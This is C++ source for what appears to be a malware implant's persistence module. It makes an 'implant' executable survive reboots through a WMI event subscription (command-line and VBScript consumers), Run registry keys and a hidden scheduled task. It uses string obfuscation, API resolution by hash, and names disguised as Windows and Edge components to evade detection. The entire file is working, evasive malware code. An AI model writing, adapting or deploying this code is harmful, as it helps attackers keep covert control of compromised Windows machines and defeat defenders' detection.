// persistence.cpp — Registry + WMI + Scheduled Task (all obfuscated)
#define WIN32_LEAN_AND_MEAN
#include "persistence.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <string>
#include <vector>

static const wchar_t* WMI_CMD_CONSUMER()    { static auto s = XSW(L"BrokerServicePerf_v2");    return s.str(); }
static const wchar_t* WMI_SCRIPT_CONSUMER() { static auto s = XSW(L"WinStoreSvcHelper_v3");    return s.str(); }
static const wchar_t* WMI_FILTER_NAME()     { static auto s = XSW(L"SystemPerfMonitor_v2");    return s.str(); }
static const wchar_t* REG_RUN_NAME()        { static auto s = XSW(L"WindowsStorageService");   return s.str(); }
static const wchar_t* WMI_NS_SUB()          { static auto s = XSW(L"ROOT\\subscription");      return s.str(); }
static const wchar_t* WMI_NS_CIMV2()        { static auto s = XSW(L"ROOT\\CIMV2");             return s.str(); }
static const wchar_t* WQL_QUERY() {
    static auto s = XSW(
        L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
        L"AND TargetInstance.SystemUpTime >= 240 "
        L"AND TargetInstance.SystemUpTime < 325");
    return s.str();
}

struct CoGuard {
    HRESULT hr;
    HMODULE hOle;
    decltype(&CoUninitialize) _CoUninitialize = nullptr;
    CoGuard() {
        hOle = GetModuleHandleA(XS("ole32.dll"));
        if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
        if (hOle) {
            auto _CoInitializeEx = HASHPROC(hOle, CoInitializeEx);
            _CoUninitialize = HASHPROC(hOle, CoUninitialize);
            if (_CoInitializeEx) hr = _CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            else hr = E_FAIL;
        } else {
            hr = E_FAIL;
        }
    }
    ~CoGuard() { if (ok() && _CoUninitialize) _CoUninitialize(); }
    bool ok() const { return SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE; }
};

static HRESULT ConnectWMI(const wchar_t* ns, IWbemServices** ppSvc) {
    auto hOle = GetModuleHandleA(XS("ole32.dll"));
    if (!hOle) hOle = LoadLibraryA(XS("ole32.dll"));
    if (!hOle) return E_FAIL;
    auto _CoCreateInstance = HASHPROC(hOle, CoCreateInstance);
    auto _CoSetProxyBlanket = HASHPROC(hOle, CoSetProxyBlanket);
    if (!_CoCreateInstance || !_CoSetProxyBlanket) return E_FAIL;
    IWbemLocator* pLoc = nullptr;
    HRESULT hr = _CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                   IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) return hr;
    hr = pLoc->ConnectServer(_bstr_t(ns), nullptr, nullptr, nullptr, 0, nullptr, nullptr, ppSvc);
    pLoc->Release();
    if (FAILED(hr)) return hr;
    return _CoSetProxyBlanket(*ppSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                              RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                              nullptr, EOAC_NONE);
}

static HRESULT PutStr(IWbemClassObject* obj, const wchar_t* prop, const wchar_t* val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}
static HRESULT PutBool(IWbemClassObject* obj, const wchar_t* prop, bool val) {
    _variant_t v(val);
    return obj->Put(prop, 0, &v, 0);
}

BOOL InstallWmiPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(WMI_NS_SUB(), &pSvc))) return FALSE;
    BOOL success = FALSE;
    do {
        // EventFilter
        IWbemClassObject* pFClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr, &pFClass, nullptr))) break;
        IWbemClassObject* pFInst = nullptr;
        pFClass->SpawnInstance(0, &pFInst); pFClass->Release();
        PutStr(pFInst, L"Name", WMI_FILTER_NAME());
        PutStr(pFInst, L"QueryLanguage", L"WQL");
        PutStr(pFInst, L"Query", WQL_QUERY());
        PutStr(pFInst, L"EventNamespace", WMI_NS_CIMV2());
        HRESULT hr = pSvc->PutInstance(pFInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pFInst->Release();
        if (FAILED(hr)) break;
        // CommandLineEventConsumer
        IWbemClassObject* pCClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, nullptr, &pCClass, nullptr))) break;
        IWbemClassObject* pCInst = nullptr;
        pCClass->SpawnInstance(0, &pCInst); pCClass->Release();
        PutStr(pCInst, L"Name", WMI_CMD_CONSUMER());
        PutStr(pCInst, L"CommandLineTemplate", implantPath);
        PutBool(pCInst, L"RunInteractively", false);
        hr = pSvc->PutInstance(pCInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pCInst->Release();
        if (FAILED(hr)) break;
        // Binding
        IWbemClassObject* pBClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr, &pBClass, nullptr))) break;
        IWbemClassObject* pBInst = nullptr;
        pBClass->SpawnInstance(0, &pBInst); pBClass->Release();
        std::wstring filterRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
        std::wstring consumerRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":CommandLineEventConsumer.Name=\"" + std::wstring(WMI_CMD_CONSUMER()) + L"\"";
        PutStr(pBInst, L"Filter", filterRef.c_str());
        PutStr(pBInst, L"Consumer", consumerRef.c_str());
        hr = pSvc->PutInstance(pBInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;
        success = TRUE;
    } while (false);
    pSvc->Release();
    return success;
}

BOOL InstallWmiScriptPersistence(const wchar_t* implantPath) {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(WMI_NS_SUB(), &pSvc))) return FALSE;
    std::string implantPathUtf8 = WStringToUTF8(implantPath);
    std::wstring script =
        L"Dim oSh : Set oSh = CreateObject(\"WScript.Shell\")\r\n"
        L"Dim oFSO : Set oFSO = CreateObject(\"Scripting.FileSystemObject\")\r\n"
        L"Dim sPath : sPath = \"" + std::wstring(implantPath) + L"\"\r\n"
        L"If oFSO.FileExists(sPath) Then\r\n"
        L"  oSh.Run Chr(34) & sPath & Chr(34), 0, False\r\n"
        L"End If\r\n";
    BOOL success = FALSE;
    do {
        IWbemClassObject* pAClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, nullptr, &pAClass, nullptr))) break;
        IWbemClassObject* pAInst = nullptr;
        pAClass->SpawnInstance(0, &pAInst); pAClass->Release();
        PutStr(pAInst, L"Name", WMI_SCRIPT_CONSUMER());
        PutStr(pAInst, L"ScriptingEngine", L"VBScript");
        PutStr(pAInst, L"ScriptText", script.c_str());
        _variant_t vKill(0);
        pAInst->Put(L"KillTimeout", 0, &vKill, 0);
        HRESULT hr = pSvc->PutInstance(pAInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pAInst->Release();
        if (FAILED(hr)) break;
        // Bind
        IWbemClassObject* pBClass = nullptr;
        if (FAILED(pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr, &pBClass, nullptr))) break;
        IWbemClassObject* pBInst = nullptr;
        pBClass->SpawnInstance(0, &pBInst); pBClass->Release();
        std::wstring filterRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
        std::wstring scriptConsRef = std::wstring(L"\\\\.\\") + WMI_NS_SUB() + L":ActiveScriptEventConsumer.Name=\"" + std::wstring(WMI_SCRIPT_CONSUMER()) + L"\"";
        PutStr(pBInst, L"Filter", filterRef.c_str());
        PutStr(pBInst, L"Consumer", scriptConsRef.c_str());
        hr = pSvc->PutInstance(pBInst, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
        pBInst->Release();
        if (FAILED(hr)) break;
        success = TRUE;
    } while (false);
    pSvc->Release();
    return success;
}

BOOL InstallRegistryPersistence(const wchar_t* implantPath) {
    static auto hAdv = GetModuleHandleA(XS("advapi32.dll"));
    if (!hAdv) hAdv = LoadLibraryA(XS("advapi32.dll"));
    auto _RegOpenKeyExW = HASHPROC(hAdv, RegOpenKeyExW);
    auto _RegSetValueExW = HASHPROC(hAdv, RegSetValueExW);
    auto _RegCloseKey = HASHPROC(hAdv, RegCloseKey);
    if (!_RegOpenKeyExW || !_RegSetValueExW || !_RegCloseKey) return FALSE;
    std::wstring val = L"\"" + std::wstring(implantPath) + L"\"";
    auto runKey = XSW(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HKEY hKey = nullptr;
    LONG rc = _RegOpenKeyExW(HKEY_CURRENT_USER, runKey.str(), 0, KEY_SET_VALUE, &hKey);
    if (rc != ERROR_SUCCESS) return FALSE;
    rc = _RegSetValueExW(hKey, REG_RUN_NAME(), 0, REG_SZ,
                         reinterpret_cast<const BYTE*>(val.c_str()),
                         static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
    _RegCloseKey(hKey);
    if (IsElevated()) {
        HKEY hklm = nullptr;
        if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, runKey.str(), 0, KEY_SET_VALUE, &hklm) == ERROR_SUCCESS) {
            _RegSetValueExW(hklm, REG_RUN_NAME(), 0, REG_SZ,
                            reinterpret_cast<const BYTE*>(val.c_str()),
                            static_cast<DWORD>((val.size() + 1) * sizeof(wchar_t)));
            _RegCloseKey(hklm);
        }
    }
    return (rc == ERROR_SUCCESS);
}

BOOL InstallScheduledTaskPersistence(const wchar_t* implantPath) {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring level = IsElevated() ? L"HIGHEST" : L"LIMITED";
    std::wstring trigger = IsElevated() ? L"ONSTART" : L"ONLOGON";
    std::wstring cmd = L"\"" + schtasks + L"\" /Create /F "
                       L"/TN \"MicrosoftEdgeUpdateTaskUser\" "
                       L"/TR \"\\\"" + std::wstring(implantPath) + L"\\\"\" "
                       L"/SC " + trigger + L" /RL " + level;
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (exitCode == 0);
    }
    return FALSE;
}

BOOL IsScheduledTaskInstalled() {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring cmd = L"\"" + schtasks + L"\" /Query /TN \"MicrosoftEdgeUpdateTaskUser\"";
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (exitCode == 0);
    }
    return FALSE;
}

BOOL RemoveScheduledTaskPersistence() {
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring schtasks = std::wstring(sysRoot) + L"\\System32\\schtasks.exe";
    std::wstring cmd = L"\"" + schtasks + L"\" /Delete /F /TN \"MicrosoftEdgeUpdateTaskUser\"";
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD exitCode = 1;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (exitCode == 0);
    }
    return FALSE;
}

BOOL IsWmiPersistenceInstalled() {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;
    std::wstring query = L"SELECT * FROM CommandLineEventConsumer WHERE Name='" + std::wstring(WMI_CMD_CONSUMER()) + L"'";
    IEnumWbemClassObject* pEnum = nullptr;
    HRESULT hr = pSvc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(query.c_str()),
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 nullptr, &pEnum);
    BOOL found = FALSE;
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject* pObj = nullptr;
        ULONG ret = 0;
        if (pEnum->Next(WBEM_INFINITE, 1, &pObj, &ret) == WBEM_S_NO_ERROR && ret) {
            found = TRUE;
            pObj->Release();
        }
        pEnum->Release();
    }
    pSvc->Release();
    return found;
}

BOOL RemoveWmiPersistence() {
    CoGuard com;
    if (!com.ok()) return FALSE;
    IWbemServices* pSvc = nullptr;
    if (FAILED(ConnectWMI(L"ROOT\\subscription", &pSvc))) return FALSE;
    auto del = [&](const std::wstring& path) {
        pSvc->DeleteInstance(_bstr_t(path.c_str()), 0, nullptr, nullptr);
    };
    std::wstring consPath = L"CommandLineEventConsumer.Name=\"" + std::wstring(WMI_CMD_CONSUMER()) + L"\"";
    std::wstring scriptPath = L"ActiveScriptEventConsumer.Name=\"" + std::wstring(WMI_SCRIPT_CONSUMER()) + L"\"";
    std::wstring filterPath = L"__EventFilter.Name=\"" + std::wstring(WMI_FILTER_NAME()) + L"\"";
    del(L"__FilterToConsumerBinding.Consumer=\"" + consPath + L"\",Filter=\"" + filterPath + L"\"");
    del(L"__FilterToConsumerBinding.Consumer=\"" + scriptPath + L"\",Filter=\"" + filterPath + L"\"");
    del(consPath);
    del(scriptPath);
    del(filterPath);
    pSvc->Release();
    return TRUE;
}